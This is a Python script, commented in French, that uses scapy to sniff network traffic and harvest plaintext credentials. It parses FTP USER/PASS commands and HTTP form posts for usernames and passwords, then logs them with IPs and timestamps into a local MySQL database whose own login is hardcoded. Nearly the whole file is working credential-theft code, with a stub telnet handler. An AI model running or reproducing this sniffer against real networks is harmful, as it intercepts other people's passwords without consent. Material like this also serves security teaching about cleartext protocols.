#!/usr/bin/python3
from scapy.all import *
import mysql.connector
import datetime
import re



# Connection to MySQL database
db = mysql.connector.connect(
    host="localhost",
    user="enzo",
    password="root",
    database="wirepass_db"
)
cursor = db.cursor()

def packet_callback(pkt):
    if pkt.haslayer(TCP) and pkt.haslayer(IP):
        src_ip = pkt[IP].src
        dst_ip = pkt[IP].dst
        dst_port = pkt[TCP].dport

        if dst_port == 21:
            handle_ftp_packet(pkt, src_ip, dst_ip)
        elif dst_port == 23:
            handle_telnet_packet(pkt, src_ip, dst_ip)
        elif dst_port == 80:
            handle_http_packet(pkt, src_ip, dst_ip)

def handle_ftp_packet(pkt, src_ip, dst_ip):
    if pkt.haslayer(Raw):
        payload = pkt[Raw].load.decode("utf-8", errors="ignore")
        if "USER" in payload:
            lines = payload.split("\r\n")
            for line in lines:
                if line.startswith("USER"):
                    global ftp_username
                    ftp_username = line.split(" ")[1]
                    print("FTP CONNEXION : {} -> {}".format(src_ip, dst_ip))
                    print("Username : {}".format(ftp_username))
        if "PASS" in payload:
            lines = payload.split("\r\n")
            for line in lines:
                if line.startswith("PASS"):
                    global ftp_password
                    ftp_password = line.split(" ")[1]
                    print("Mot de passe : {}".format(ftp_password))
        if "QUIT" in payload:
            print("Connexion terminée : {} -> {}".format(src_ip, dst_ip))
            # Supprimer l'utilisateur de la base de données
            # delete_user('ftp', src_ip, dst_ip)
        if "SYST" in payload:
            print("Login successful for", ftp_username)
            current_time = datetime.datetime.now()
            formatted_heur = str(current_time.strftime('%H:%M:%S'))
            current_date = datetime.date.today()
            user = {
                'type': 'FTP',
                'source_ip': dst_ip,
                'destination_ip': src_ip,
                'username': ftp_username,
                'password': ftp_password,
                'day': current_date,
                'heur': formatted_heur
            }
            insert_user(user)

def handle_telnet_packet(pkt, src_ip, dst_ip):
    if pkt.haslayer(Raw):
        payload = pkt[Raw].load.decode("utf-8", errors="ignore")
        print("PAYLOAD",payload)
        if ":" in payload:
            print("debut du nom d'utilisateur")
        if "\r\n" in payload:
            print("FIN")

import re
import datetime

def handle_http_packet(pkt, src_ip, dst_ip):
    if pkt.haslayer(Raw):
        payload = pkt[Raw].load.decode("utf-8", errors="ignore")
        uname_keywords = ["uname", "user", "username", "User", "txtUsername", "mail"]

        
        for uname_keyword in uname_keywords:
            if uname_keyword in payload and "&" in payload:
                # Extraction de l'hôte
                try:
                    host_match = re.search(r"Host: (.+)", payload)
                    host = host_match.group(1)
                    destination_ip = dst_ip + ":" + host

                except:
                    destination_ip = dst_ip

                # Extraction de uname
                uname_match = re.search(fr"{uname_keyword}=(\w+)&", payload)
                if uname_match:
                    uname = uname_match.group(1)
                else:
                    uname = None
                
                # Extraction de pass
                pass_match = re.search(r"&(.+)", payload)
                if pass_match:
                    password = pass_match.group(1)
                else:
                    password = None

                payload2 = password
                equal_sign_index = payload2.find("=")

                if equal_sign_index != -1:
                    password2 = payload2[equal_sign_index + 1:].strip()
                else:
                    password2 = None

                current_time = datetime.datetime.now()
                formatted_heur = str(current_time.strftime('%H:%M:%S'))
                current_date = datetime.date.today()

                if uname is not None and password:
                    user = {
                        'type': 'HTTP',
                        'source_ip': src_ip,
                        'destination_ip': host,
                        'username': uname,
                        'password': password2,
                        'day': current_date,
                        'heur': formatted_heur
                    }
                    insert_user(user)
                    print("HTTP CONNEXION : {} -> {}".format(src_ip, dst_ip))
                    print("Host :", host)
                    print("Username :", uname)
                    print("Mot de passe :",password)

                



def insert_user(user):
    sql = "INSERT INTO users (type, source_ip, destination_ip, username, password, day, heur) VALUES (%s, %s, %s, %s, %s, %s, %s)"
    values = (user['type'], user['source_ip'], user['destination_ip'], user['username'], user['password'], user['day'], user['heur'])
    cursor.execute(sql, values)
    db.commit()

def start_packet_sniffing():
    sniff(filter="tcp", prn=packet_callback, store=0)
    #sniff(filter="tcp", prn=ftp_packet_callback, store=0)
    #sniff(filter="tcp", prn=telnet_packet_callback, store=0)
    #sniff(filter="tcp", prn=smtp_packet_callback, store=0)

if __name__ == '__main__':
    start_packet_sniffing()
    
